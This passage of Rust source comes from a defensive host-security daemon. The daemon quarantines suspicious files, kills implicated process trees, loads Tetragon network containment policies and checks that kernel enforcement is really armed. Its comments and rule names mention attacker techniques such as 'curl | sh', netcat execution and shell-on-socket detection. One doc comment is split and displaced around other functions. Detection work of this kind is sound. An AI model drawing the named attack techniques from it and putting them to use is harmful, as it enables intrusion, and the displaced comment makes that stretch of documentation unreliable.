    /// is right and ending a process is wrong.
    ///
    /// **A `signal`-tier step's file is never moved unless the chain is
    /// `critical`.** A signal rule is a building block by declaration: right
    /// about what it saw, weak about what it means. `moat-exec-untrusted-tmpfs`
    /// names the binary a build just produced under `/tmp` hundreds of times a
    /// day, and acting on the file a weak rule pointed at, on the strength of a
    /// correlation that only reached `high`, is the one shape where this can
    /// destroy work while being technically correct about every step.
    fn quarantine_chain_artifacts(&mut self, c: &crate::chain::Chain) {
        if !self.cfg.contain.enabled {
            return;
        }
        let gate = self.chain_gate(c);
        if let Err(why) = &gate.verdict {
            // The same wording as the kill's own refusal, so `moatctl
            // decisions` reads as one gate that governs both and not two
            // policies that happen to agree.
            let families = gate.families.clone();
            let why = why.clone();
            log::info!("chain {}: not quarantining -- {}", c.id, why);
            self.record_decision(
                &c.id,
                &c.severity,
                &families,
                "quarantine_spared",
                &why,
                &[],
            );
            return;
        }
        let critical = crate::alert::severity_rank(&c.severity)
            >= crate::alert::severity_rank("critical");
        let mut roots = self.homes.clone();
        roots.extend(["/tmp".into(), "/var/tmp".into(), "/dev/shm".into()]);
        let base = self.cfg.paths.quarantine();

        for step in c.steps.iter().filter(|s| s.is_trigger()) {
            // The families whose artefact IS the attack: something dropped and
            // run, and something arranged to run again. A `net` step names no
            // file worth moving, and an allowlisted step names one the user
            // already said was fine.
            if step.family != "exec" && step.family != "persist" {
                continue;
            }
            let Some(a) = self.find_alert(&step.alert) else { continue };
            if a.suppressed_by.is_some() || a.action_taken != "none" {
                continue;
            }
            if a.is_building_block() && !critical {
                log::info!(
                    "chain {}: not quarantining the file named by {} -- it is a signal rule and \
                     the chain is {}, not critical",
                    c.id,
                    a.rule,
                    c.severity
                );
                continue;
            }
            let Some(path) = a.file.as_ref().map(|f| f.path.clone()) else { continue };
            if path.is_empty() || !util::under_any(&path, &roots) {
                continue;
            }
            if crate::evidence::is_secret_path(&path) {
                continue;
            }
            match crate::control::quarantine_file(&base, &a.id, &path, &a.rule, &a.title) {
                Ok(dest) => {
                    let _ = self.mark(&a.id, "action_taken", Value::from("quarantined"));
                    log::warn!(
                        "chain {}: quarantined {} -> {}",
                        c.id,
                        path,
                        dest.display()
                    );
                }
                Err(e) => log::error!("chain {}: quarantine {}: {}", c.id, path, e),
            }
        }
    }

    /// What a chain would have killed, and -- only in `kill` mode -- killing it.
    ///
    /// Runs on every `high` chain regardless of mode, because the whole point
    /// of `log` is to gather the evidence that says whether the rules are safe
    /// to act on. Nothing is signalled unless `[contain] kill = "kill"`.
    fn maybe_kill_tree(&mut self, c: &crate::chain::Chain, now: u64) {
        let mode = self.cfg.contain.kill.clone();
        if mode == "off" {
            return;
        }
        // One decision per chain. `note_chain` re-enters every time the chain
        // grows, for up to an hour: without this, every later trigger in a high
        // tree would be killed as it appeared -- for a build, the rest of the
        // build.
        if self.killed_chains.contains(&c.id) {
            return;
        }

        let gate = self.chain_gate(c);
        let (facts, families, uid) = (gate.facts, gate.families, gate.uid);
        if let Err(why) = gate.verdict {
            self.record_decision(&c.id, &c.severity, &families, "spared", &why, &[]);
            // INFO, not DEBUG. The refusals are the whole point of `log` mode:
            // the argument for ever moving to `kill` is a week of these that
            // are all correct, and at debug level -- which nothing enables --
            // "the gate declined" and "the gate never ran" were the same
            // silence. Found live on 2026-09-05 with kill armed and a chain
            // sitting right there unrefused and unkilled.
            log::info!("chain {}: not killing -- {}", c.id, why);
            return;
        }

        // Is the ancestor itself the actor? `node -e` and `curl | sh` put the
        // malicious process at the root of its own tree.
        let ancestor_families: std::collections::BTreeSet<&str> = facts
            .iter()
            .filter(|f| f.pid == c.ancestor.pid)
            .map(|f| f.family.as_str())
            .collect();
        let spare_ancestor = ancestor_families.len() < 2;

        let targets = crate::contain::tree_targets(&c.steps, c.ancestor.pid, spare_ancestor);
        // A cap, so a gate that is still wrong costs one build and not a day.
        const MAX_TARGETS: usize = 8;
        let mut named: Vec<String> = Vec::new();
        let mut doomed: Vec<u32> = Vec::new();
        for t in targets.iter().take(MAX_TARGETS) {
            if let Some(why) = crate::contain::refuse_to_kill(t.pid, uid) {
                // Same reasoning: a spared process is a decision, and a
                // decision nobody can see cannot be reviewed.
                log::info!("chain {}: sparing pid {} ({})", c.id, t.pid, why);
                continue;
            }
            named.push(format!("{} ({})", t.pid, t.exe));
            doomed.push(t.pid);
        }
        if doomed.is_empty() {
            return;
        }
        self.killed_chains.insert(c.id.clone());

        if mode != "kill" {
            log::warn!(
                "WOULD HAVE KILLED {} for chain {} ({}): {}",
                doomed.len(),
                c.id,
                c.severity,
                named.join(", ")
            );
            self.record_decision(
                &c.id,
                &c.severity,
                &families,
                "would_have_killed",
                "gate passed; kill mode is log",
                &named,
            );
            return;
        }

        // Stop the whole set before killing any of it, or the first SIGKILL is
        // a starting pistol for whatever the others fork.
        for pid in &doomed {
            unsafe { libc::kill(*pid as i32, libc::SIGSTOP) };
        }
        let mut killed = 0usize;
        for pid in &doomed {
            if unsafe { libc::kill(*pid as i32, libc::SIGKILL) } == 0 {
                killed += 1;
            }
        }
        log::warn!("killed {} process(es) for chain {}: {}", killed, c.id, named.join(", "));
        self.record_decision(&c.id, &c.severity, &families, "killed", "gate passed", &named);
        self.raise_protection_change(
            &format!("end {} process(es) implicated in one sequence", killed),
            "moat itself, from chain correlation",
            named,
        );
    }

    /// Refuse this sequence's connections, for a while, and nothing else.
    ///
    /// The kernel rule that would have caught this excludes RFC1918, because a
    /// selector cannot tell the developer's own package registry from a C2 on
    /// the same subnet. Userspace can: `moat-net-first-contact` has already
    /// established that nothing on this machine had ever used that destination,
    /// and `chain.rs` has established that it happened inside a sequence worth
    /// interrupting for. So the decision is made here and the enforcement is
    /// handed back to the kernel, scoped to one binary and one address.
    fn maybe_contain(&mut self, c: &crate::chain::Chain, now: u64) {
        if !self.cfg.contain.enabled {
            return;
        }
        if crate::alert::severity_rank(&c.severity) < crate::alert::severity_rank("high") {
            return;
        }
        if self.contain.is_contained(&c.id) {
            return;
        }

        // Only from steps that TRIGGERED. A step the user allowlisted is in the
        // story for context, and a sequence is not a licence to act on
        // something they said was fine.
        let mut members: std::collections::BTreeMap<String, (String, String)> =
            std::collections::BTreeMap::new();
        for step in c.steps.iter().filter(|s| s.is_trigger()) {
            let Some(a) = self.find_alert(&step.alert) else {
                continue;
            };
            if a.suppressed_by.is_some() {
                continue;
            }
            let Some(net) = a.net.as_ref() else { continue };
            if net.dst_ip.is_empty() {
                continue;
            }
            members.insert(a.id.clone(), (a.process.exe.clone(), net.dst_ip.clone()));
        }
        let targets = crate::contain::targets(&members);
        // A sequence with nothing outbound in it has nothing to contain. That
        // is most of them, and it is not a failure.
        // EVERY binary that reached out, and every destination it reached.
        //
        // This took `targets.into_iter().next()`, which for the 2026-09-05 lab
        // chain contained `python` -- already exited -- and left the dropped
        // `browser-helper` free to keep beaconing. Containing the process that
        // has finished is not containment.
        if targets.is_empty() {
            return;
        }
        let mut exes: Vec<String> = Vec::new();
        let mut dests: Vec<String> = Vec::new();
        for (exe, ds) in targets {
            // BOTH the path tetragon reported and the path it resolves to.
            //
            // `matchBinaries` matches the binary the kernel actually executed,
            // not the name it was invoked by. Tetragon reported `/usr/bin/
            // python` for the 2026-09-05 lab chain; `/usr/bin/python` is a
            // symlink to `python3` to `python3.14`, so a containment naming
            // the reported path loaded, armed, and matched nothing -- the
            // policy was live in enforce mode with a match count of zero while
            // the beacon went straight through it.
            //
            // Proven on this machine rather than reasoned about: a copy of
            // curl under /tmp was refused EPERM to 1.1.1.1:80, and a symlink
            // under /tmp pointing at that same binary outside /tmp reached the
            // same address a second later.
            //
            // Both go in because `In` takes a list and neither is reliably the
            // right one: an interpreter reached through a symlink needs the
            // resolved path, and a binary moatd cannot resolve (deleted,
            // replaced, or on a mount that is gone) still needs the reported
            // one.
            for name in crate::contain::binary_aliases(&exe) {
                if !exes.contains(&name) {
                    exes.push(name);
                }
            }
            for d in ds {
                if !dests.contains(&d) {
                    dests.push(d);
                }
            }
        }

        // Pick the slot BEFORE writing anything: `tp add` fails if a policy
        // of that name is already loaded, so an occupied slot has to be
        // released first rather than discovered half way through.
        let slot = self.contain_slot_for(&c.id);
        let policy = crate::contain::policy_name(slot);
        let yaml = crate::contain::policy_yaml(
            &policy,
            &exes,
            &dests,
            &c.id,
            self.cfg.contain.ttl_secs,
        );
        let path = self.cfg.paths.runtime_dir.join(format!("{}.yaml", policy));
        if let Err(e) = std::fs::write(&path, yaml) {
            log::error!("contain {}: {}", policy, e);
            return;
        }
        if !self.tetra_policy(&["tp", "add", &path.to_string_lossy()]) {
            let _ = std::fs::remove_file(&path);
            return;
        }

        let record = crate::contain::Containment {
            chain: c.id.clone(),
            policy,
            exes: exes.clone(),
            dests: dests.clone(),
            since: now,
            expires: now + self.cfg.contain.ttl_secs,
        };
        log::warn!(
            "contained {}: {:?} may not reach {:?} for {}s (chain {})",
            record.policy,
            exes,
            dests,
            self.cfg.contain.ttl_secs,
            c.id
        );
        for dropped in self.contain.insert(record, self.cfg.contain.max) {
            self.release_contain(&dropped);
        }
        self.write_state();
    }

    /// Delete a containment's policy. Best effort by design: a policy that is
    /// Write one kill-gate decision to moat's own store.
    ///
    /// The refusals are the evidence for whether this gate can ever be
    /// trusted, and until 2026-09-05 they existed only as journald lines --
    /// which is not a record. journald is sized by a percentage of the disk,
    /// evicts oldest-first, is not in the support bundle, and cannot be
    /// queried by moat at all. "Run in log mode for a week and review it" is
    /// not a plan you can carry out against a log that may not keep a week.
    ///
    /// Its own file rather than a line kind in `alerts.jsonl`, because that
    /// file now rotates at 4 MiB with one generation kept, and a busy day of
    /// alerts would evict the handful of lines that matter most. These are
    /// small and rare: 1 MiB holds thousands, which is many months.
    fn record_decision(
        &mut self,
        chain: &str,
        severity: &str,
        families: &[String],
        verdict: &str,
        reason: &str,
        targets: &[String],
    ) {
        let line = serde_json::json!({
            "v": 1,
            "ts": util::now_rfc3339(),
            "chain": chain,
            "severity": severity,
            "families": families,
            "verdict": verdict,
            "reason": reason,
            "mode": self.cfg.contain.kill,
            "targets": targets,
        });
        let path = self.cfg.paths.state_dir.join("decisions.jsonl");
        // Rotate before appending so the file cannot exceed the cap; one
        // generation, like the alert store.
        if std::fs::metadata(&path).map(|m| m.len()).unwrap_or(0) >= 1024 * 1024 {
            let _ = std::fs::rename(&path, path.with_extension("1.jsonl"));
        }
        use std::io::Write as _;
        match std::fs::OpenOptions::new().create(true).append(true).open(&path) {
            Ok(mut f) => {
                let _ = writeln!(f, "{}", line);
            }
            Err(e) => log::warn!("decisions.jsonl: {}", e),
        }
    }

    /// Which containment slot this chain should use.
    ///
    /// Reuses the slot this chain already holds (a chain that grows is
    /// re-contained, not doubly contained); otherwise the lowest free slot;
    /// otherwise the slot of the oldest live containment, which is released
    /// first so `tp add` is not handed a name the kernel already has. That
    /// eviction is the same one `Containments::insert` would do a moment
    /// later -- doing it here just means the kernel and the record agree.
    fn contain_slot_for(&mut self, chain: &str) -> usize {
        let max = self.cfg.contain.max.max(1);
        let slot_of = |c: &crate::contain::Containment| -> Option<usize> {
            c.policy.rsplit('-').next().and_then(|n| n.parse::<usize>().ok())
        };
        let live = self.contain.live();
        if let Some(s) = live.iter().find(|c| c.chain == chain).and_then(slot_of) {
            return s;
        }
        let taken: Vec<usize> = live.iter().filter_map(slot_of).collect();
        if let Some(free) = (0..max).find(|s| !taken.contains(s)) {
            return free;
        }
        // Every slot is in use. The oldest goes, and its policy is deleted
        // from the kernel before its name is reused.
        let oldest = live.iter().min_by_key(|c| c.since).cloned();
        match oldest {
            Some(c) => {
                let s = slot_of(&c).unwrap_or(0);
                self.release_contain(&c);
                s
            }
            None => 0,
        }
    }

    /// already gone (tetragon restarted) is not an error, and a failure here
    /// must not leave the record behind, or `moatctl release` would report
    /// success on something it never removed.
    fn release_contain(&mut self, c: &crate::contain::Containment) {
        self.tetra_policy(&["tp", "delete", &c.policy]);
        let path = self
            .cfg
            .paths
            .runtime_dir
            .join(format!("{}.yaml", c.policy));
        let _ = std::fs::remove_file(&path);
        log::info!("released containment {} ({})", c.policy, c.chain);
    }

    /// Expire what has run out. Called from the same tick as the baseline.
    pub fn contain_tick(&mut self, now: u64) {
        let gone = self.contain.expired(now);
        if gone.is_empty() {
            return;
        }
        for c in &gone {
            self.release_contain(c);
        }
        self.write_state();
    }

    /// The policies whose kernel mode must be `enforce` right now.
    ///
    /// Pure, so the decision can be tested without a kernel: `run()` does the
    /// applying.
    ///
    /// **Kernel policies only, deliberately.** An armed userland rule
    /// (`moat-pkg-subtree-netcat-exec`, `moat-shell-stdio-socket`) has nothing
    /// to push into the kernel — it kills from `maybe_enforce`, in this
    /// process, gated on `mode_for`. So it needs no re-arming after a tetragon
    /// restart, and calling `tetra tp set-mode` on a name the kernel has never
    /// heard of would fail and be reported as enforcement that did not take.
    /// Its round trip across a daemon restart is `enforcing_rules` in
    /// state.json, which `write_state` writes and `persisted_enforcing_rules`
    /// reads back, exactly as for a kernel rule.
    pub fn enforcement_to_apply(&self) -> Vec<String> {
        self.policies
            .names()
            .into_iter()
            .filter(|n| self.mode_for(n) == "enforce")
            .collect()
    }

    /// Push the armed set back into the kernel.
    ///
    /// `tetra tp set-mode` changes a LIVE policy, and that change dies with the
    /// sensor. `enforcing_rules` and `mode` are restored from state.json on
    /// startup, but until 2026-09-04 they were restored into MEMORY only -- so
    /// after any tetragon restart (an update, a crash; moatd is `PartOf=` it and
    /// restarts with it) every armed rule silently reverted to the `monitor` in
    /// its policy file, while `status.enforcing_rules` and the panel both went
    /// on saying ARMED. Enforcement that has quietly stopped, shown as running,
    /// is the worst state this daemon can be in: the user believes a thing is
    /// guarded and it is not.
    ///
    /// Called from `arm_tick`, which owns the *when*. Calling it directly is
    /// "push now, whatever the sensor is doing", which is the 2026-09-05 bug.
    pub fn reapply_enforcement(&mut self) -> (usize, usize) {
        let want = self.enforcement_to_apply();
        if want.is_empty() {
            return (0, 0);
        }
        let (mut ok, mut failed) = (0usize, 0usize);
        for name in &want {
            if self.tetra_arm(name) {
                ok += 1;
            } else {
                failed += 1;
            }
        }
        if failed > 0 {
            log::error!(
                "re-arming: {} of {} policies did NOT take; the panel would \
                 otherwise show them armed",
                failed,
                want.len()
            );
        } else {
            log::info!("re-armed {} policy/policies in the kernel", ok);
        }
        (ok, failed)
    }

    /// `tetra tp set-mode <name> enforce`, with the clock bounded.
    ///
    /// Same reason as `kernel_policy_modes`: this runs from the tick, under the
    /// daemon mutex, and `tetra`'s default 30 s timeout with a retry means one
    /// unreachable sensor could hold the event tail for minutes -- times the
    /// number of armed policies. The arming state machine retries on its own
    /// clock, so a short per-call bound loses nothing.
    fn tetra_arm(&self, name: &str) -> bool {
        self.tetra_policy(&["tp", "set-mode", name, "enforce", "--timeout", "3s", "--retries", "1"])
    }

    // ------------------------------------------------------- arming, verified

    /// Is the sensor loaded enough for `tetra tp set-mode` to mean anything?
    ///
    /// Two independent answers, because either can be unavailable:
    ///
    /// 1. The bpffs pin count (`sensors_loaded`) against the policies on disk.
    ///    This is the same signal `tetragon_state` trusts and it asks the
    ///    kernel, but it reads `/sys/fs/bpf/tetragon`, which is root-only and
    ///    does not exist at all until the sensor creates it.
    /// 2. `tetra tracingpolicy list`, which has to name every policy we are
    ///    about to arm. Slower (a gRPC round trip) and used only when the pin
    ///    count is unreadable — but it is the *exact* question, since a name
    ///    the daemon is about to `set-mode` either exists or does not.
    ///
    /// Neither available means "cannot tell", which is reported as NOT ready:
    /// waiting a bounded 120 s costs nothing, and arming into a half-loaded
    /// sensor costs the whole point of arming.
    pub fn sensor_ready_for(&self, want: &[String]) -> bool {
        let expected = self.policies.len();
        if let Some(n) = self.sensors_loaded() {
            return expected > 0 && n >= expected;
        }
        match self.kernel_policy_modes() {
            Some(modes) if !modes.is_empty() => want.iter().all(|n| modes.contains_key(n)),
            _ => false,
        }
    }

    /// Start the bounded wait-then-arm. Called once per daemon start.
    ///
    /// It does NOT arm here. On 2026-09-05 arming here (2 s after start, from
    /// `run()`, before the first event) failed seven times out of seven with
    /// `tracing policy {moat-…} does not exist`, because tetragon was still
    /// loading — 16 s of loading, on a unit systemd had already called
    /// "started" because it is `Type=simple`.
    pub fn begin_arming(&mut self, now: u64) {
        if self.enforcement_to_apply().is_empty() {
            self.arming = Arming::Idle;
            return;
        }
        self.arming = Arming::Waiting {
            deadline: now.saturating_add(self.cfg.thresholds.arm_wait_secs.max(1)),
            next_try: now,
            tries: 0,
        };
    }

    /// The arming state machine, driven from `tick` — never from the event
    /// path, so a 120 s wait for the sensor cannot stall the tail for 120 s.
    ///
    /// `Waiting` -> (sensor ready) -> push, verify -> `Idle` when every policy
    /// took; back to `Waiting` with backoff when any did not, until the
    /// deadline. On the deadline it pushes once regardless and lets
    /// `verify_enforcement` publish whatever is true.
    pub fn arm_tick(&mut self, now: u64) {
        let Arming::Waiting { deadline, next_try, tries } = self.arming else {
            return;
        };
        if now < next_try {
            return;
        }
        let want = self.enforcement_to_apply();
        if want.is_empty() {
            self.arming = Arming::Idle;
            return;
        }
        let out_of_time = now >= deadline;
        if !self.sensor_ready_for(&want) {
            if !out_of_time {
                if tries == 0 {
                    log::info!(
                        "arming pending: waiting up to {}s for the sensor to load before \
                         re-arming {} policy/policies",
                        self.cfg.thresholds.arm_wait_secs,
                        want.len()
                    );
                }
                self.arming = Arming::Waiting {
                    deadline,
                    next_try: now.saturating_add(arm_backoff(tries)),
                    tries: tries.saturating_add(1),
                };
                return;
            }
            log::error!(
                "the sensor is still not loaded {}s after start; arming {} policy/policies \
                 anyway so the attempt and its outcome are on the record",
                self.cfg.thresholds.arm_wait_secs,
                want.len()
            );
        }

        let (_, failed) = self.reapply_enforcement();
        if failed == 0 || out_of_time {
            self.arming = Arming::Idle;
        } else {
            self.arming = Arming::Waiting {
                deadline,
                next_try: now.saturating_add(arm_backoff(tries)),
                tries: tries.saturating_add(1),
            };
        }
        // Whatever happened, say what is true rather than what was attempted.
        self.verify_enforcement(now);
    }

    /// Ask the kernel what mode each policy is actually in.
    ///
    /// `tetra tracingpolicy list -o json` (tetra v1.7.1) returns
    /// `ListTracingPoliciesResponse`, whose `policies` array carries
    /// `TracingPolicyStatus { name, mode, … }`; `mode` is the
    /// `TracingPolicyMode` enum — `TP_MODE_ENFORCE` (1), `TP_MODE_MONITOR` (2).
    /// Field numbers and names read out of the descriptor embedded in
    /// /usr/bin/tetra, not guessed.
    ///
    /// `None` means we could not ask (no tetra, gRPC refused, unparseable) —
    /// which is "cannot tell", never "not armed". A verifier that reports a
    /// failure it did not observe is the same lie as the one this fixes,
    /// pointing the other way.
    pub fn kernel_policy_modes(&self) -> Option<std::collections::BTreeMap<String, String>> {
        let out = std::process::Command::new(&self.cfg.paths.tetra)
            // `tetra` defaults to a 30 s gRPC dial timeout, i.e. up to a
            // minute across its two attempts -- and this runs on the tick,
            // holding the daemon mutex, which is the event tail and the control
            // socket. A verification that freezes the daemon for a minute
            // whenever the sensor is unreachable is worse than the gap it is
            // looking for. Cobra takes global flags after the subcommand.
            //
            // `--retries 0` is NOT the way to shorten this: it builds a gRPC
            // retry policy with MaxAttempts 1, which gRPC rejects as invalid,
            // and every call fails before it dials. Verified against
            // /usr/bin/tetra v1.7.1. The default of 1 (two attempts) stays; the
            // dial timeout is what gets cut.
            .args(["tracingpolicy", "list", "-o", "json", "--timeout", "3s", "--retries", "1"])
            .output()
            .ok()?;
        if !out.status.success() {
            log::debug!(
                "tetra tracingpolicy list: {}",
                String::from_utf8_lossy(&out.stderr).trim()
            );
            return None;
        }
        parse_policy_modes(&String::from_utf8_lossy(&out.stdout))
    }

    /// Compare the kernel against `enforcing_rules`, re-arm the difference, and
    /// publish whichever answer survives.
    ///
    /// Runs after arming and once a minute for ever after, because `tetra tp
    /// set-mode` changes a LIVE policy: anything that reloads a policy later —
    /// `exclude_binary`, a tetragon that restarts without taking moatd with it,
    /// a human with `tetra` — drops it back to the `monitor` its file declares,
    /// silently.
    pub fn verify_enforcement(&mut self, now: u64) {
        self.last_verify = now;
        let want = self.enforcement_to_apply();
        if want.is_empty() {
            self.enforcing_verified.clear();
            if !self.enforcing_unverified.is_empty() {
                log::info!("nothing is armed in the kernel any more; the arming gap is closed");
                self.enforcing_unverified.clear();
            }
            self.last_arm_alert_set.clear();
            return;
        }
        let Some(modes) = self.kernel_policy_modes() else {
            // Could not ask. Keep the previous answer: an unreachable sensor is
            // `sensor_unhealthy`'s story to tell, and inventing a second one
            // out of the same silence would double-count it.
            return;
        };

        let disagreed = disagreeing(&want, &modes);
        // The steady state is one `tetra` call a minute: nothing disagrees, so
        // there is nothing to re-arm and nothing to re-read.
        let still_wrong = if disagreed.is_empty() {
            Vec::new()
        } else {
            log::warn!(
                "the kernel disagrees about {} armed policy/policies; re-arming",
                disagreed.len()
            );
            for name in &disagreed {
                self.tetra_arm(name);
            }
            // Read the kernel BACK rather than trusting the exit status: a
            // `set-mode` that returns 0 is a claim, and claims are what this
            // whole function exists because of. If the sensor stopped answering
            // between the two calls, keep the previous verdict rather than
            // publishing a gap nobody observed.
            match self.kernel_policy_modes() {
                Some(m) => disagreeing(&want, &m),
                None => return,
            }
        };

        let unverified: std::collections::BTreeSet<String> = still_wrong.iter().cloned().collect();
        let verified: std::collections::BTreeSet<String> =
            want.iter().filter(|n| !unverified.contains(*n)).cloned().collect();
        for name in self.enforcing_unverified.difference(&unverified) {
            log::warn!("{} is armed in the kernel again", name);
        }
        self.enforcing_verified = verified;
        self.enforcing_unverified = unverified;

        if self.enforcing_unverified.is_empty() {
            // Clearing this is what lets the NEXT gap raise its own alert.
            self.last_arm_alert_set.clear();
            return;
        }
        log::error!(
            "enforcement did not take for {} of {} armed policy/policies: {}",
            self.enforcing_unverified.len(),
            want.len(),
            self.enforcing_unverified.iter().cloned().collect::<Vec<_>>().join(", ")
        );
        if self.enforcing_unverified != self.last_arm_alert_set {
            self.last_arm_alert_set = self.enforcing_unverified.clone();
            let names: Vec<String> = self.enforcing_unverified.iter().cloned().collect();
            let total = want.len();
            self.raise_enforcement_gap(&names, total);
        }
    }

    /// One alert, in the `moat-x-protection-changed` family, for enforcement
    /// that is recorded but not running.
    ///
    /// Same family as a human disarming a rule, and deliberately so: the effect
    /// on this machine is identical — a rule the panel shows as armed that will
    /// not kill anything — and the difference is only that nobody chose it.
    /// `NEVER_SILENCE` covers the family, so this cannot be allowlisted away.
    fn raise_enforcement_gap(&mut self, names: &[String], total: usize) {
        if self.in_meta_alert {
            return;
        }
        let action = format!(
            "enforcement did not take in the kernel for {} of {} armed policy/policies",
            names.len(),
            total
        );
        let meta = crate::rules::protection_changed_meta(&action, "moatd");
        let mut f = Finding::new(crate::rules::PROTECTION_CHANGED, meta, self_proc("arming"));
        f.hook = "userland".into();
        f.mode = self.mode.clone();
        f.what_override = Some(format!(
            "Moat's own check found {} of {} armed policy/policies in `monitor` in the kernel. \
             They are listed as enforcing and they will not kill anything.",
            names.len(),
            total
        ));
        f.extra_evidence.push(format!("not armed in the kernel: {}", names.join(", ")));
        f.extra_evidence.push(
            "Moat re-armed them and read the kernel back; they are still in monitor.".into(),
        );
        f.extra_evidence.push(
            "check: `moatctl status` (the `enforcing` line names them), then \
             `journalctl -u moatd -u tetragon -n 100`"
                .into(),
        );
        f.extra_evidence.push(
            "fix: `sudo systemctl restart tetragon` — moatd re-arms once the sensor \
             reports the policies loaded"
                .into(),
        );
        self.in_meta_alert = true;
        let _ = self.emit(f);
        self.in_meta_alert = false;
    }

    /// Anything that changes what SHOULD be armed, or reloads a policy in the
    /// kernel, makes the last verification describe a machine that no longer
    /// exists. Marking it stale makes the next tick re-read the kernel instead
    /// of leaving `status` quoting an answer about the previous arrangement.
    pub fn invalidate_verification(&mut self) {
        self.last_verify = 0;
    }

    /// Cheap enough for every tick; the gRPC round trip is throttled to a
    /// minute. Skipped entirely while `arm_tick` is still working, because
    /// during the startup wait "the kernel says monitor" is expected and
    /// alerting on it would fire on every boot.
    pub fn verify_tick(&mut self, now: u64) {
        const EVERY: u64 = 60;
        if matches!(self.arming, Arming::Waiting { .. }) {
            return;
        }
        if now.saturating_sub(self.last_verify) < EVERY {
            return;
        }
        self.verify_enforcement(now);
    }

    /// Stop an ARMED policy watching one binary, in the kernel.
    ///
    /// This is what "allow this program" has to mean for a rule that enforces.
    /// An allowlist entry is a userspace suppression and never reaches the
    /// kernel, so allowing an armed rule used to hide the alert while the
    /// process kept dying. The only thing that actually stops the killing is
    /// taking the binary out of the policy, which means re-rendering it and
    /// loading it again.
    ///
    /// Granularity is per BINARY, not per (binary, file): `matchBinaries` is
    /// the only negative the kernel offers here, so excluding `cat` from the
    /// shadow rule stops that rule watching `cat` for ALL of its paths. The
    /// caller has to say so; silently granting more than was asked for is how
    /// an allowlist becomes a hole.
    pub fn exclude_binary(&mut self, rule: &str, exe: &str) -> Result<String, String> {
        if !exe.starts_with('/') {
            return Err(format!("{:?} is not an absolute path", exe));
        }
        if self.policies.meta_or_fallback(rule).enforce == "none" {
            return Err(format!("{} does not enforce, so there is nothing to exclude", rule));
        }
        let list = self.kernel_exclusions.entry(rule.to_string()).or_default();
        if !list.iter().any(|b| b == exe) {
            list.push(exe.to_string());
        }

        // Re-render everything: it is 46 small files, and rendering only the
        // one would need the template path, which the policy set does not keep.
        let opts = crate::render::RenderOptions {
            templates_dir: &self.cfg.paths.templates_dir,
            out_dir: &self.cfg.paths.policies_dir,
            export_allowlist: Some(&self.cfg.paths.export_allowlist),
            passwd: &self.cfg.paths.passwd,
            homes: None,
            telemetry: self.cfg.telemetry.clone(),
            exclusions: self.kernel_exclusions.clone(),
        contain_slots: self.cfg.contain.max,
        };
        crate::render::render(&opts).map_err(|e| format!("render: {}", e))?;

        // Replace the live policy. `tp add` will not overwrite, so the old one
        // is deleted first -- a gap of milliseconds, and the alternative is an
        // exclusion that does not take effect until the next reboot.
        let path = self.rendered_path(rule)?;
        self.tetra_policy(&["tp", "delete", rule]);
        if !self.tetra_policy(&["tp", "add", &path]) {
            return Err(format!(
                "{} could not be reloaded; run `sudo systemctl restart tetragon` to \
                 put it back",
                rule
            ));
        }
        // A fresh load starts in the mode its FILE declares, which is monitor.
        // Re-arm it or the exclusion would silently disarm the whole rule.
        // `mode_for`, not `enforcing_rules.contains`: a daemon-wide enforce
        // arms every policy without listing any of them, and testing the list
        // here left a rule silently in monitor after every exclusion while
        // `status` went on saying enforce.
        if self.mode_for(rule) == "enforce" {
            self.tetra_policy(&["tp", "set-mode", rule, "enforce"]);
        }
        self.policies = crate::policy::PolicySet::load(&self.cfg.paths.policies_dir);
        // The policy was deleted and re-added, so its kernel mode was reset to
        // the `monitor` its file declares and the re-arm above may not have
        // taken. Re-verify on the next tick.
        self.invalidate_verification();
        self.write_state();
        Ok(path)
    }

    /// Take a kernel exclusion back.
    ///
    /// The counterpart to `exclude_binary`, and not optional: a grant that
    /// cannot be revoked is not a grant, it is a hole with a nice name. Same
    /// mechanics -- re-render, reload, re-arm -- because the exclusion lives in
    /// the policy text and nothing else can remove it.
    ///
    /// Unlike granting one, this does NOT need root: it makes Moat watch more,
    /// and the rule everywhere else in this daemon is that weakening protection
    /// needs privilege while restoring it does not.
    pub fn remove_exclusion(&mut self, rule: &str, exe: &str) -> Result<String, String> {
        let gone = match self.kernel_exclusions.get_mut(rule) {
            Some(list) => {
                let before = list.len();
                list.retain(|b| b != exe);
                let removed = list.len() != before;
                if list.is_empty() {
                    self.kernel_exclusions.remove(rule);
                }
                removed
            }
            None => false,
        };
        if !gone {
            return Err(format!("{} was not excluded from {}", exe, rule));
        }

        let opts = crate::render::RenderOptions {
            templates_dir: &self.cfg.paths.templates_dir,
            out_dir: &self.cfg.paths.policies_dir,
            export_allowlist: Some(&self.cfg.paths.export_allowlist),
            passwd: &self.cfg.paths.passwd,
            homes: None,
            telemetry: self.cfg.telemetry.clone(),
            exclusions: self.kernel_exclusions.clone(),
        contain_slots: self.cfg.contain.max,
        };
        crate::render::render(&opts).map_err(|e| format!("render: {}", e))?;

        let path = self.rendered_path(rule)?;
        self.tetra_policy(&["tp", "delete", rule]);
        if !self.tetra_policy(&["tp", "add", &path]) {
            return Err(format!(
                "{} could not be reloaded; run `sudo systemctl restart tetragon` to put \
                 it back",
                rule
            ));
        }
        if self.mode_for(rule) == "enforce" {
            self.tetra_policy(&["tp", "set-mode", rule, "enforce"]);
        }
        self.policies = crate::policy::PolicySet::load(&self.cfg.paths.policies_dir);
        // The policy was deleted and re-added, so its kernel mode was reset to
        // the `monitor` its file declares and the re-arm above may not have
        // taken. Re-verify on the next tick.
        self.invalidate_verification();
        self.write_state();
        log::warn!("{} is watched again by {}", exe, rule);
        Ok(path)
    }

    /// Where a policy's rendered YAML lives.
    fn rendered_path(&self, rule: &str) -> Result<String, String> {
        let dir = &self.cfg.paths.policies_dir;
        let rd = std::fs::read_dir(dir).map_err(|e| format!("{}: {}", dir.display(), e))?;
        for entry in rd.flatten() {
            let p = entry.path();
            if p.extension().map(|e| e != "yaml" && e != "yml").unwrap_or(true) {
                continue;
            }
            if let Ok(text) = std::fs::read_to_string(&p) {
                if text.contains(&format!("name: {}", rule)) {
                    return Ok(p.display().to_string());
                }
            }
        }
        Err(format!("no rendered policy for {}", rule))
    }

    /// Release everything, for the switch going off.
    pub fn release_all_contained(&mut self) -> usize {
        let all: Vec<crate::contain::Containment> = self.contain.live().to_vec();
        for c in &all {
            self.release_contain(c);
            self.contain.release(&c.chain);
        }
        self.write_state();
        all.len()
    }

    /// Drop one now, by chain id.
    pub fn release_chain(&mut self, chain: &str) -> bool {
        let Some(c) = self.contain.release(chain) else {
            return false;
        };
        self.release_contain(&c);
        self.write_state();
        true
    }

    fn tetra_policy(&self, args: &[&str]) -> bool {
